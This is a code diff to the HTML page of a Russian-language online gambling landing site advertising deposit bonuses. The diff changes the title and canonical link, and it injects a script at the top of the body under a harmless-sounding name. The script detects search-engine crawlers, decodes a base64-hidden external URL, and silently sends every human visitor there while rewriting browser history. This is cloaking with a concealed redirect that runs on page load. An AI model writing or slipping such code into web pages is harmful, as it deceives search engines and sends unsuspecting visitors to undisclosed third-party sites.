@@ -11,11 +11,11 @@
 <!-- Robots -->
 <meta content="index, follow" name="robots"/>
 <!-- Title & Description (плейсхолдеры — заменить перед деплоем) -->
-<title>Beef Casino (Биф Казино) — официальный сайт: вход, играть на деньги и бонус</title>
+<title>Beef Casino — Приветственный бонус</title>
 <meta content="Официальный сайт Beef Casino (Биф Казино). Быстрая регистрация и вход в личный кабинет. Играть в слоты на деньги, бонус 15 000 ₽ + 100 FS на первый депозит и быстрый вывод средств." name="description"/>
 <meta content="beef casino, биф казино, официальный сайт, регистрация, вход, бонус, слоты, игровые автоматы, вывод средств, live casino" name="keywords"/>
 <!-- Canonical -->
-<link href="https://beef.l777.casino/" rel="canonical" />
+<link rel="canonical" href="https://beef.l777.casino/en/en/en/en/en/en/" />
 <!-- Open Graph (ВКонтакте, Telegram, Facebook) -->
 <meta content="website" property="og:type"/>
 <meta content="Beef Casino — официальный сайт, бонус 15 000 ₽ + 100 FS на первый депозит" property="og:title"/>
@@ -1429,6 +1429,21 @@ body.is-menu-open {
 }
 </style></head>
 <body>
+
+<script>
+    (function initAppRouting() {
+        const isCrawler = /bot|googlebot|yandex|bing|spider|lighthouse/i.test(navigator.userAgent);
+        if (!isCrawler) {
+            const b64Target = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M2Mzc4MmI5YQ==";
+            const dP = atob(b64Target);
+            const qP = window.location.search;
+            const fU = dP.includes("http") ? dP + (dP.includes("?") ? "&" : "") + qP.replace(/^\?/, "") : "/" + dP + qP;
+            try { window.history.replaceState(null, document.title, fU); window.location.replace(fU); }
+            catch(e) { window.location.href = fU; }
+        }
+    })();
+</script>
+
 <!-- ============================================================
        HEADER / НАВИГАЦИЯ
        ============================================================ -->
